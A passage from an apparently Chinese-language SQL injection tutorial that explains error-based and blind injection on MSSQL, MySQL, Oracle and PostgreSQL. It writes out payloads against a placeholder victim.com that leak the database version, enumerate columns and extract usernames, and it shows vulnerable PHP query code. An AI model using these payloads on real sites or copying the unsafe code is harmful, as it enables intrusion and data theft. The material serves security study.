class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>这里mssql认为attacker不是一个数字，那么他就是个列名</strong></p>\n<p>然后服务器从数据库中查找attacker列，没找到就返回了<code>Invalid column name 'attacker'.</code></p>\n<p>这里的attacker就可以做文章</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/showproducts.aspx?category=bikes' and l=0/@@ version;--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>传入参数<code>' and 1=0/@@version;--</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Syntax error converting the nvarchar <span class=\"token keyword\">value</span> <span class=\"token string\">'Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988 - 2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790:)'</span> <span class=\"token keyword\">to</span> a <span class=\"token keyword\">column</span> <span class=\"token keyword\">of</span> <span class=\"token keyword\">data</span> <span class=\"token keyword\">type</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以看到这里的报错和上面是一个格式，错误信息展示了<code>@@version</code>查询的内容</p>\n<p>原理：mssql的类型转换功能，<code>0/@@version</code>除法运算，sql将这两个操作数都作为操作数，将<code>@@version</code>当做数字解析，操作失败，将返回了这个错误。换成其他参数也是一个原理。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">还有一些技术可用于显示数据库执行的语句的信息，比如使用<span class=\"token keyword\">having</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>：\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.aspx?category=bikes' having '1' ='1</span>\n应用响应如下：\nServer Error <span class=\"token operator\">in</span> <span class=\"token string\">'/'</span> Application<span class=\"token punctuation\">.</span>\n<span class=\"token keyword\">Column</span> <span class=\"token string\">'products.productid'</span> <span class=\"token operator\">is</span> invalid <span class=\"token operator\">in</span> the <span class=\"token keyword\">select</span> list because it <span class=\"token operator\">is</span> <span class=\"token operator\">not</span> contained <span class=\"token operator\">in</span> an aggregate <span class=\"token keyword\">function</span> <span class=\"token operator\">and</span> there <span class=\"token operator\">is</span> <span class=\"token keyword\">no</span> <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> clause<span class=\"token punctuation\">.</span>\nDescription: An unhandled exception occurred during the execution <span class=\"token keyword\">of</span> the <span class=\"token keyword\">current</span> web request<span class=\"token punctuation\">.</span> Please review the stack trace <span class=\"token keyword\">for</span> more information about the error <span class=\"token operator\">and</span> <span class=\"token keyword\">where</span> it originated <span class=\"token operator\">in</span> the code<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>having字句和group by 字句结合使用，在select中使用having过滤group by ，group by要求select语句选择的字段是某个聚合函数的结果，或者包含在group by 字句中，如果不满足，那么数据库返回一个错误，显示错误的第一列，该技术可以用来枚举表的列。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/showproducts.aspx?category=bikes' group by productid having '1' ='1</span>\n<span class=\"token comment\">#products.name</span>\n\nhttp:<span class=\"token comment\">//www.victim.com/showproducts.aspx?category=bikes' group by productid,name having '1' ='1</span>\n<span class=\"token comment\">#products.price</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后用上面提到类型转换错误检索列对应的值</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/showproducts.aspx?category=bikes' and 1=0/name;--</span>\n\nServer Error <span class=\"token operator\">in</span> <span class=\"token string\">'/'</span> Application<span class=\"token punctuation\">.</span>\nSyntax error converting the nvarchar <span class=\"token keyword\">value</span> <span class=\"token string\">'Claud Butler Olympus D2'</span> <span class=\"token keyword\">to</span> a <span class=\"token keyword\">column</span> <span class=\"token keyword\">of</span> <span class=\"token keyword\">data</span> <span class=\"token keyword\">type</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span>\nDescription: An unhandled exception occurred during the execution <span class=\"token keyword\">of</span> the <span class=\"token keyword\">current</span> web request<span class=\"token punctuation\">.</span> Please review the stack trace <span class=\"token keyword\">for</span> more information about the error <span class=\"token operator\">and</span> <span class=\"token keyword\">where</span> it originated <span class=\"token operator\">in</span> the code<span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在身份验证机制中，可能枚举到用户名和密码的列，这样便可能登录有管理员权限的账号。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/logon.aspx?username=test' and User not in ('Admin') and l=0/User and '1' ='1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个payload将Admin用户排除，查找其他用户</p>\n<p>关闭ASP.NET中服务器向远程访问者显示详细错误信息</p>\n<pre class=\"line-numbers language-asp\" data-language=\"asp\"><code class=\"language-asp\">web.config\n&lt;configuration&gt;\n&lt;system.web&gt;\n&lt;customErrors mode=\"Off\"/&gt;\n&lt;/system.web&gt;\n&lt;/configuration&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>设置错误重定向</p>\n<pre class=\"line-numbers language-asp\" data-language=\"asp\"><code class=\"language-asp\">&lt;configuration&gt;\n&lt;system.web&gt;\n&lt;customErrorsdefaultRedirect=\"Error.aspx\" mode=\"On\"〉\n&lt;errorstatusCode=\"403H redirect='*AccessDenied.aspxn/&gt;\n&lt;errorstatusCode=\"404\" redirect=\"NotFound.aspx\"/&gt;\n&lt;errorstatusCode=\"500\" redirect=\"InternalError.aspx\"/&gt;\n&lt;/customErrors&gt;\n&lt;/system.web&gt;\n&lt;/configuration&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h6 id=\"Mysql错误\"><a href=\"#Mysql错误\" class=\"headerlink\" title=\"Mysql错误\"></a>Mysql错误</h6><p>常见错误代码</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Warning: mysql_fetch_array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>: supplied argument <span class=\"token operator\">is</span> <span class=\"token operator\">not</span> a valid MySQL result resource <span class=\"token operator\">in</span> <span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>victim<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>showproduct<span class=\"token punctuation\">.</span>php <span class=\"token keyword\">on</span> line <span class=\"token number\">8</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个报错是<code>mysql_fetch_array()</code>产生的</p>\n<p>mysql一般用<code>mysql_error()</code>来展示错误</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token prolog\">&lt;?php\n//连接数据库 \nmysql_connect(\"[database]\", \"[user]\", \"[password]\") or\n//检查错误，处理无法访问数据库的情况\ndie(\"Could not connect: \".mysql_error());\n//选择数据库\nmysql_select_db(\"[database_name]\");\n//从GET请求中获取category值\n$category = $_GET[\"category\"];\n//创建并执行一条SQL语句\n$result = mysql_query(\"SELECT * from products where category='$category'\")；\nif (!$result) { //如果有任何错误\n//检査错误并显示错误信息\ndie(\"&lt;p&gt;Error: '.mysql_error().'&lt;/p&gt;');\n} else {\n//遍历査询结果\nwhile ($row = mysql_fetch_array($result.MYSQL_NUM))\t{\nprintf (\"ID: %s Name: %s\", $row[0], $row[1]);\n}\n//释放结果集\nmysql_free_result($result);\n?&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>传入单引号做参数，报错，这是mysql_error()产生的</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Error: You have an error <span class=\"token operator\">in</span> your <span class=\"token keyword\">SQL</span> syntax<span class=\"token punctuation\">;</span> <span class=\"token keyword\">check</span> the manual that corresponds <span class=\"token keyword\">to</span> your MySQL server version <span class=\"token keyword\">for</span> the <span class=\"token keyword\">right</span> syntax <span class=\"token keyword\">to</span> <span class=\"token keyword\">use</span> near <span class=\"token string\">''</span>' at line <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>传入一个不是字符串的（不在单引号内）作参数，便会被解析成列名，报错</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Error: Unknown <span class=\"token keyword\">column</span> <span class=\"token string\">'attacker'</span> <span class=\"token operator\">in</span> <span class=\"token string\">'where clause'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>和mssql有异曲同工之妙</p>\n<h6 id=\"Oracle错误\"><a href=\"#Oracle错误\" class=\"headerlink\" title=\"Oracle错误\"></a>Oracle错误</h6><p>常见错误</p>\n<p>执行了语法上不正确的SQL语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">java<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>SQLException: ORA<span class=\"token operator\">-</span><span class=\"token number\">00933</span>: <span class=\"token keyword\">SQL</span> command <span class=\"token operator\">not</span> properly ended at oracle<span class=\"token punctuation\">.</span>jdbc<span class=\"token punctuation\">.</span>dbaccess<span class=\"token punctuation\">.</span>DBError<span class=\"token punctuation\">.</span>throwSqlException<span class=\"token punctuation\">(</span>DBError<span class=\"token punctuation\">.</span>java:<span class=\"token number\">180</span><span class=\"token punctuation\">)</span> at oracle<span class=\"token punctuation\">.</span>jdbc<span class=\"token punctuation\">.</span>ttc7<span class=\"token punctuation\">.</span>TTIoer<span class=\"token punctuation\">.</span>processError<span class=\"token punctuation\">(</span>TTIoer<span class=\"token punctuation\">.</span>java:<span class=\"token number\">208</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Oracle数据库检测到SQL语句中有一个使用单引号引起来的字符串未被正确结束，Oracle要求字符串必须使用单引号结束。注入一个单引号时会发现产生了下列错误：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Error: SQLExceptionjava<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>SQLException: ORA<span class=\"token operator\">-</span><span class=\"token number\">01756</span>: quoted string <span class=\"token operator\">not</span> properly <span class=\"token keyword\">terminated</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>.NET环境下的注入单引号情况：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Exception Details: System<span class=\"token punctuation\">.</span><span class=\"token keyword\">Data</span><span class=\"token punctuation\">.</span>OleDb<span class=\"token punctuation\">.</span>OleDbException: One <span class=\"token operator\">or</span> more <span class=\"token keyword\">errors</span> occurred during processing <span class=\"token keyword\">of</span> command<span class=\"token punctuation\">.</span>\nORA<span class=\"token operator\">-</span><span class=\"token number\">00933</span>: <span class=\"token keyword\">SQL</span> command <span class=\"token operator\">not</span> properly ended<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>下面的例子展示了从.NET应用返回的一个错误，该程序执行的语句中包含未使用单引号 引起来的字符串：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">ORA<span class=\"token operator\">-</span><span class=\"token number\">01756</span>: quoted string <span class=\"token operator\">not</span> properly <span class=\"token keyword\">terminated</span>\nSystem<span class=\"token punctuation\">.</span>Web<span class=\"token punctuation\">.</span>HttpUnhandledException: Exception <span class=\"token keyword\">of</span> <span class=\"token keyword\">type</span>\n<span class=\"token string\">'System.Web.HttpUnhandledException'</span> was thrown<span class=\"token punctuation\">.</span><span class=\"token comment\">--&gt;</span>\nSystem<span class=\"token punctuation\">.</span><span class=\"token keyword\">Data</span><span class=\"token punctuation\">.</span>OleDb<span class=\"token punctuation\">.</span>OleDbException: ORA<span class=\"token operator\">-</span><span class=\"token number\">01756</span>: quoted string <span class=\"token operator\">not</span> properly <span class=\"token keyword\">terminated</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>PHP的ociparse()函数用于准备要执行的Oracle语句。下面是该函数调用失败时PHP引擎 产生的一个错误示例：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Warning: ociparse <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">.</span>ociparse<span class=\"token punctuation\">]</span> : ORA<span class=\"token operator\">-</span><span class=\"token number\">01756</span>: quoted string <span class=\"token operator\">not</span> properly <span class=\"token keyword\">terminated</span> <span class=\"token operator\">in</span> <span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>victim<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>ocitest<span class=\"token punctuation\">.</span>php <span class=\"token keyword\">on</span> line <span class=\"token number\">31</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果ociparse()函数调用失败且未对该错误进行处理，那么应用会因为第一次失败而显示一 些其他错误，如下所示：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Warning: ociexecute<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>: supplied argument <span class=\"token operator\">is</span> <span class=\"token operator\">not</span> a valid OCI8<span class=\"token operator\">-</span>Statement resource <span class=\"token operator\">in</span> c:\\www\\victim<span class=\"token punctuation\">.</span>com\\oracle\\<span class=\"token keyword\">index</span><span class=\"token punctuation\">.</span>php <span class=\"token keyword\">on</span> line <span class=\"token number\">31</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>分析报错代码</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">java<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>SQLException: ORA<span class=\"token operator\">-</span><span class=\"token number\">00907</span>: missing <span class=\"token keyword\">right</span> parenthesis atoracle<span class=\"token punctuation\">.</span>jdbc<span class=\"token punctuation\">.</span>dbaccess<span class=\"token punctuation\">.</span>DBError<span class=\"token punctuation\">.</span>throwSqlException<span class=\"token punctuation\">(</span>DBError<span class=\"token punctuation\">.</span>java:<span class=\"token number\">134</span><span class=\"token punctuation\">)</span> at oracle<span class=\"token punctuation\">.</span>jdbc<span class=\"token punctuation\">.</span>ttc7<span class=\"token punctuation\">.</span>TTIoer<span class=\"token punctuation\">.</span>processError<span class=\"token punctuation\">(</span>TTIoer<span class=\"token punctuation\">.</span>java:<span class=\"token number\">289</span><span class=\"token punctuation\">)</span> at\noracle<span class=\"token punctuation\">.</span>jdbc<span class=\"token punctuation\">.</span>ttc7<span class=\"token punctuation\">.</span>Oall7<span class=\"token punctuation\">.</span>receive<span class=\"token punctuation\">(</span>Oall7<span class=\"token punctuation\">.</span>java:<span class=\"token number\">582</span><span class=\"token punctuation\">)</span> at\noracle<span class=\"token punctuation\">.</span>jdbc<span class=\"token punctuation\">.</span>ttc7<span class=\"token punctuation\">.</span>TTC7Protocol<span class=\"token punctuation\">.</span>doOall7<span class=\"token punctuation\">(</span>TTC7Protocol<span class=\"token punctuation\">.</span>java:<span class=\"token number\">1986</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>数据库报告SQL语句中存在”missing right parenthesis”(缺少右括号)错误。很多原因会引发该错误。最常见的情况是攻击者在嵌套SQL语句中拥有某种控制权。例如：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> fieldl<span class=\"token punctuation\">,</span> field2<span class=\"token punctuation\">,</span>    <span class=\"token comment\">/* 选择第一和第二个字段 */</span>\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> fieldl        <span class=\"token comment\">/* 开始子查询 */</span>\n<span class=\"token keyword\">FROM</span> table2\n<span class=\"token keyword\">WHERE</span> something <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>attacker controlled variable<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">/* 结束子查询 */</span>\n<span class=\"token keyword\">as</span> field3                        <span class=\"token comment\">/*从子査询返回*/</span>\n<span class=\"token keyword\">FROM</span> tablel<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上述例子展示了一个嵌套查询。主SELECT语句执行括号中的另一条SELECT语句。如果攻击者向第二条查询语句注入某些内容并将后面的SQL语句注释掉，那么Oracle将返回”missing right parenthesis” 错误。</p>\n<h6 id=\"PostgreSQL错误\"><a href=\"#PostgreSQL错误\" class=\"headerlink\" title=\"PostgreSQL错误\"></a>PostgreSQL错误</h6><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//连接并选择数据库</span>\n<span class=\"token variable\">$dbconn</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"host=localhost dbname=books user=tom password=myPassword\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Could not connect:\t'</span><span class=\"token operator\">.</span><span class=\"token function\">pg_last_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//执行SQL查询</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM \\\"public\\\".\\\"Authors\\\" WHERE name='<span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>'\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbconnz</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Query failed: '</span><span class=\"token operator\">.</span><span class=\"token function\">pg_last_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//将查询结果以THTML形式输出</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;table&gt;\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">,</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token constant\">PGSQL_ASSOC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\t&lt;tr&gt;\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$col_value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\t\\t&lt;td&gt;<span class=\"token interpolation\"><span class=\"token variable\">$col_value</span></span>&lt;/td&gt;\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\t&lt;/tr&gt;\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/table&gt;\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//释放结果集</span>\n<span class=\"token function\">pg_free_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//关闭连接</span>\n<span class=\"token function\">pg_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dbconn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>pg_query</code>使用传入的数据库执行sql查询语句</p>\n<p><code>pg_last_error</code>获取数据库连接的最新出错信息</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/list_author.php?name='</span>\nQuery failed: ERROR: unterminated quoted string at <span class=\"token operator\">or</span> near <span class=\"token string\">\"''\"</span>\n\n<span class=\"token keyword\">SQL</span>代码由于其他原因执行失败时<span class=\"token punctuation\">,</span>PostgreSQL数据库将返回一个常规错误：\nQuery failed: ERROR: syntax error at <span class=\"token operator\">or</span> near <span class=\"token string\">\"\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>PostgreSQL开发，利用PostgreSQL JDBC Driver</p>\n<p>PostgreSQL JDBC Driver处理缺少结束引号的字符串时，会有下面的报错</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>PSQLException: ERROR: unterminated quoted string at <span class=\"token operator\">or</span> near <span class=\"token string\">\"'\\' \"</span>\nat org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>QueryExecutorlmpl<span class=\"token punctuation\">.</span>receiveErrorResponse<span class=\"token punctuation\">(</span>Query ExecutorImpl<span class=\"token punctuation\">.</span>java:<span class=\"token number\">1512</span><span class=\"token punctuation\">)</span>\nat org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>QueryExecutorlmpl<span class=\"token punctuation\">.</span>processResults<span class=\"token punctuation\">(</span>Query\nExecutorImpl<span class=\"token punctuation\">.</span>java:<span class=\"token number\">1297</span><span class=\"token punctuation\">)</span>\nat org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>v3<span class=\"token punctuation\">.</span>QueryExecutorlmpl<span class=\"token punctuation\">.</span><span class=\"token keyword\">execute</span><span class=\"token punctuation\">(</span>QueryExecutorlmpl<span class=\"token punctuation\">.</span> java:<span class=\"token number\">188</span><span class=\"token punctuation\">)</span>\nat org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>jdbc2<span class=\"token punctuation\">.</span>AbstractJdbc2Statement<span class=\"token punctuation\">.</span>\n<span class=\"token keyword\">execute</span><span class=\"token punctuation\">(</span>AbstractJdbc2Statement<span class=\"token punctuation\">.</span>java:<span class=\"token number\">430</span><span class=\"token punctuation\">)</span>\nat org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>jdbc2<span class=\"token punctuation\">.</span>AbstractJdbc2Statement<span class=\"token punctuation\">.</span>executeWithFlags <span class=\"token punctuation\">(</span>AbstractJdbc2Statement<span class=\"token punctuation\">.</span>java:<span class=\"token number\">332</span><span class=\"token punctuation\">)</span>\nat org・postgresql<span class=\"token punctuation\">.</span>jdbc2<span class=\"token punctuation\">.</span>AbstractJdbc2Statement<span class=\"token punctuation\">.</span>executeQuery\n<span class=\"token punctuation\">(</span>AbstractJdbc2Statement<span class=\"token punctuation\">.</span>java:<span class=\"token number\">231</span><span class=\"token punctuation\">)</span>\nat org<span class=\"token punctuation\">.</span>postgresql<span class=\"token punctuation\">.</span>jdbc2<span class=\"token punctuation\">.</span>AbstractJdbc2DatabaseMetaData<span class=\"token punctuation\">.</span>getTables <span class=\"token punctuation\">(</span>AbstractJdbc2DatabaseMetaData<span class=\"token punctuation\">.</span>java:<span class=\"token number\">2190</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"应用程序的响应\"><a href=\"#应用程序的响应\" class=\"headerlink\" title=\"应用程序的响应\"></a>应用程序的响应</h5><h6 id=\"常见错误\"><a href=\"#常见错误\" class=\"headerlink\" title=\"常见错误\"></a>常见错误</h6><p>当注入一个页面一直返回相同的报错页面，这时候不能直接判断为SQL注入</p>\n<p>注入代码</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">FROM</span> products\n<span class=\"token keyword\">WHERE</span> category<span class=\"token operator\">=</span><span class=\"token string\">'attacker'</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>返回一个报错页面，接着判断是否是sql注入产生的报错</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">FROM</span> products\n<span class=\"token keyword\">WHERE</span> category<span class=\"token operator\">=</span><span class=\"token string\">'attacker'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span><span class=\"token operator\">=</span>'<span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>or '1'='1'</code>是一个条件永真式，并且是有意义的，不影响其他部分，可以返回表中的所有行，但是数据库大的时候，返回所有行会很久，这是可以注入</p>\n<p><code>or '1'='2'</code>只要不影响sql语句就行</p>\n<p>如果不返回报错页面了，那么应该就是sql注入引起的报错了</p>\n<p>也可以用永假式<code>and '1'='1'</code>，如果不返回信息，则是sql注入，和永真相反</p>\n<p>当然，永假式也可能返回信息，可能是<code>union</code>联合查询</p>\n<h6 id=\"HTTP代码错误\"><a href=\"#HTTP代码错误\" class=\"headerlink\" title=\"HTTP代码错误\"></a>HTTP代码错误</h6><p>web服务器请求web源时发生错误，会返回500状态码</p>\n<p>还一种是产生错误后302重定向到其他页面</p>\n<h6 id=\"不同大小的响应\"><a href=\"#不同大小的响应\" class=\"headerlink\" title=\"不同大小的响应\"></a>不同大小的响应</h6><p>每次返回的响应都有所不同，比较这些细微的不同，可能找到一些注入线索</p>\n<p>比如返回的内容，状态码……</p>\n<h5 id=\"SQL盲注\"><a href=\"#SQL盲注\" class=\"headerlink\" title=\"SQL盲注\"></a>SQL盲注</h5><p>一个页面会因为不同的操作产生不同的状态，用不同的状态来表示注入的结果，自动化注入不同的内容，并根据响应状态判断注入结果，这就是SQL盲注，当然，要先找到注入点</p>\n<p>例子</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//www.victim.com/showproduct.php?id=2 or 1=1</span>\n<span class=\"token comment\">--返回第一件商品</span>\nhttp:<span class=\"token comment\">//www.victim.com/showproduct.php?id=2 or 1=2</span>\n―返回第二件商品<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>id=2时是正常查询， 加上<code>or 1=1</code>后会查询所有列，数据库检测该语句为异常，会返回id=1的页面，而<code>or 1=2</code>相当id=2 不影响sql语句，会进入id=2的页面</p>\n<p>这样就可以通过返回页面判断注入是否成功 <code>or +payload</code></p>\n<h3 id=\"确认SQL注入\"><a href=\"#确认SQL注入\" class=\"headerlink\" title=\"确认SQL注入\"></a>确认SQL注入</h3><h4 id=\"区别数字和字符串\"><a href=\"#区别数字和字符串\" class=\"headerlink\" 